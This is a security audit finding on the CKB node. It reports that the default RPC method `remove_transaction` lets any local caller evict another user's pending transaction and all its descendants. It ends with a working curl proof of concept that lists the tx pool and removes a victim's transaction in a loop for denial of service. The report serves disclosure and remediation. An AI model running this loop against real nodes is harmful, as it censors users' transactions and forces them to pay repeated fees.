### Title
Any Local RPC Caller Can Remove Another User's Pending Transaction Without Authorization - (`rpc/src/module/pool.rs`)

---

### Summary

The `Pool` RPC module exposes a `remove_transaction` method that accepts any transaction hash and unconditionally removes that transaction — and all its dependents — from the tx pool. There is no check that the caller is the entity that originally submitted the transaction. Any local RPC caller can silently evict another user's pending transaction, causing a sustained Denial of Service against transaction finality.

---

### Finding Description

`rpc/src/module/pool.rs` declares and implements `remove_transaction`:

```rust
// Trait declaration — line 254-255
#[rpc(name = "remove_transaction")]
fn remove_transaction(&self, tx_hash: H256) -> Result<bool>;

// Implementation — lines 662-669
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();

    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
        error!("Send remove_tx request error {}", e);
        RPCError::ckb_internal_error(e)
    })
}
```

The implementation forwards directly to `TxPoolController::remove_local_tx`, which calls `TxPool::remove_tx` and `OrphanPool::remove_orphan_tx` — removing the target transaction and every descendant from all pool stages (pending, proposed, orphan, verify queue). There is no identity token, session credential, or submitter record checked at any layer. The caller supplies only a hash.

The `Pool` module is enabled by default in the production configuration:

```toml
# resource/ckb.toml line 190
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"]
```

The RPC server binds to `127.0.0.1:8114` by default, making it reachable by any process on the same host — the exact attacker profile the prompt designates as "supported local CLI/RPC user."

The tx pool also exposes `get_raw_tx_pool` (also in the `Pool` module), which lets the attacker enumerate all pending transaction hashes before targeting them.

---

### Impact Explanation

1. **Targeted transaction eviction**: An attacker calls `get_raw_tx_pool` to enumerate pending hashes, then calls `remove_transaction` on a victim's hash. The victim's transaction disappears from the pool silently. The victim must resubmit and pay fees again.

2. **Cascading removal of dependent transactions**: `remove_entry_and_descendants` is called internally (`tx-pool/src/pool.rs` line 358-360), so a single `remove_transaction` call evicts an entire transaction chain. A high-value CPFP (child-pays-for-parent) bundle can be destroyed with one RPC call.

3. **Sustained DoS loop**: The attacker can poll `get_raw_tx_pool` and re-invoke `remove_transaction` every time the victim resubmits, permanently preventing the transaction from being mined without any rate limit or authentication barrier.

4. **Fee waste**: Each forced resubmission may require a higher fee rate (due to RBF rules), costing the victim real CKB.

---

### Likelihood Explanation

- The `Pool` module is on by default; no special configuration is required.
- The attacker needs only local process access to `127.0.0.1:8114` — a realistic condition for any co-tenant process, container escape, or SSRF vulnerability in a co-located service.
- No cryptographic material, privileged key, or operator cooperation is needed.
- The attack is trivially scriptable: enumerate hashes, call `remove_transaction` in a loop.

---

### Recommendation

Track the submitter identity (e.g., a session token or a per-connection nonce) at submission time and enforce that only the submitting connection can remove its own transaction. Alternatively, move `remove_transaction` out of the default `Pool` module into a restricted administrative module (e.g., `Debug` or a new `Admin` module) that is disabled by default and requires explicit operator opt-in, consistent with how `clear_tx_pool` and `clear_tx_verify_queue` are treated as operator-level operations.

---

### Proof of Concept

```
# Terminal 1 — victim submits a transaction
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":1,"jsonrpc":"2.0","method":"send_transaction","params":[<victim_tx>, "passthrough"]}'
# Returns: {"result": "0xVICTIM_TX_HASH"}

# Terminal 2 — attacker enumerates the pool (no auth required)
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":2,"jsonrpc":"2.0","method":"get_raw_tx_pool","params":[false]}'
# Returns pool contents including 0xVICTIM_TX_HASH

# Terminal 2 — attacker removes victim's transaction (no auth required)
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"id":3,"jsonrpc":"2.0","method":"remove_transaction","params":["0xVICTIM_TX_HASH"]}'
# Returns: {"result": true}

# Victim's transaction is now gone. All child transactions are also gone.
# Attacker loops steps 2-3 to prevent any resubmission from surviving.
```
